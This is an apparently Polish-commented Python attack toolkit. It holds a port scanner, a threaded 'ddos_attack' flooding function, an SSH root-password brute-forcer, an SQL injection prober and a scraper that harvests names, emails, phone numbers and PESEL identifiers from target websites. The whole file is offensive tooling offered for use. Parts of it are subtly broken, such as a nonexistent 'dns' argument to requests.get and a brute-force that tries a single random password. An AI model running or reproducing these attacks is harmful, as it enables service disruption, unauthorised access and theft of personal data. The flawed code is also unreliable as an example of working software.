import socket
import requests
import threading
import paramiko
import re
import argparse
import logging
import random
import os
from bs4 import BeautifulSoup
import sys

# Stałe
TIMEOUT = 0.5

# Lista serwerów DNS (możesz dowolnie zmieniać lub dodawać inne)
DNS_SERVERS = ['1.1.1.1', '1.0.0.1', '8.8.8.8', '8.8.4.4']

# Inicjalizacja loggera
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def scan_ports(target, start_port, end_port):
    """
    Funkcja skanująca porty na podanym adresie IP w danym zakresie.
    """
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((target, port))
                open_ports.append(port)
                logging.info(f"Found open port: {port}")
        except:
            pass
    return open_ports

def ddos_attack(target, num_requests=None):
    """
    Funkcja przeprowadzająca atak DDoS na podany cel.
    """
    num_requests = num_requests or random.randint(100, 1000)

    def send_request():
        try:
            # Wybierz losowy serwer DNS
            dns_server = random.choice(DNS_SERVERS)
            # Ustaw adres IP serwera DNS jako parametr dns
            response = requests.get(target, dns=(dns_server, dns_server))
            logging.info(f"Sent request to target using DNS server: {dns_server}")
        except Exception as e:
            logging.error(f"Failed to send request to target: {e}")

    threads = []
    for i in range(num_requests):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

def brute_force(target, passwords_file):
    """
    Funkcja przeprowadzająca atak brute force na SSH z wykorzystaniem podanej listy haseł.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    passwords_file = os.path.join("data", passwords_file)
    if os.path.exists(passwords_file):
        try:
            with open(passwords_file, "r") as f:
                passwords = f.readlines()
                if passwords:
                    password = random.choice(passwords).strip()
                    try:
                        ssh.connect(target, username="root", password=password)
                        logging.info(f"Brute force successful. Found password: {password}")
                        return password
                    except Exception as e:
                        logging.error(f"Brute force unsuccessful: {e}")
                else:
                    logging.warning("Empty passwords file.")
        except Exception as e:
            logging.error(f"Error reading passwords file: {e}")
            sys.exit(1)
    else:
        logging.error("Passwords file not found.")
        sys.exit(1)

    logging.warning("Brute force unsuccessful. Password not found.")
    return None

def sql_injection(target_url, sql_file):
    """
    Funkcja przeprowadzająca test SQL injection na podanej stronie internetowej.
    """
    sql_file = os.path.join("data", sql_file)
    if os.path.exists(sql_file):
        try:
            with open(sql_file, "r") as f:
                sql_queries = f.readlines()
                if sql_queries:
                    for query in sql_queries:
                        query = query.strip()
                        url = f"{target_url}?id={query}"
                        try:
                            response = requests.get(url)
                            if "error" in response.text.lower() or "database" in response.text.lower():
                                logging.info(f"SQL injection vulnerability found. Query: {repr(query)}, Response: {repr(response.text)}")
                                return query, response.text
                        except Exception as e:
                            logging.error(f"SQL injection test failed: {e}")
                else:
                    logging.warning("Empty SQL file.")
        except Exception as e:
            logging.error(f"Error reading SQL file: {e}")
            sys.exit(1)
    else:
        logging.error("SQL file not found.")
        sys.exit(1)

    logging.warning("SQL injection vulnerability not found.")
    return None

def personal_data_scan(target_url):
    """
    Funkcja przeprowadzająca skanowanie danych osobowych na podanej stronie internetowej.
    """
    patterns = {
        "Name": r"\b[A-Z][a-z]+\s[A-Z][a-z]+\b",
        "Email": r"\b[\w.-]+@[a-zA-Z]+\.[a-zA-Z]{2,3}\b",
        "Phone Number": r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b",
        "Date of Birth": r"\b\d{1,2}/\d{1,2}/\d{4}|\d{4}-\d{1,2}-\d{1,2}\b",
        "PESEL": r"\b\d{11}\b"
    }

    try:
        # Wybierz losowy serwer DNS
        dns_server = random.choice(DNS_SERVERS)
        # Ustaw adres IP serwera DNS jako parametr dns
        response = requests.get(target_url, dns=(dns_server, dns_server))
        soup = BeautifulSoup(response.text, 'html.parser')
        found_data = {}

        for key, pattern in patterns.items():
            matches = soup.find_all(text=re.compile(pattern))
            if matches:
                found_data[key] = [match.strip() for match in matches]

        if found_data:
            logging.info("Personal data found on the target website:")
            for category, data in found_data.items():
                logging.info(f"{category}: {data}")
        else:
            logging.info("No personal data found on the target website.")

    except Exception as e:
        logging.error(f"An error occurred during personal data scan: {e}")

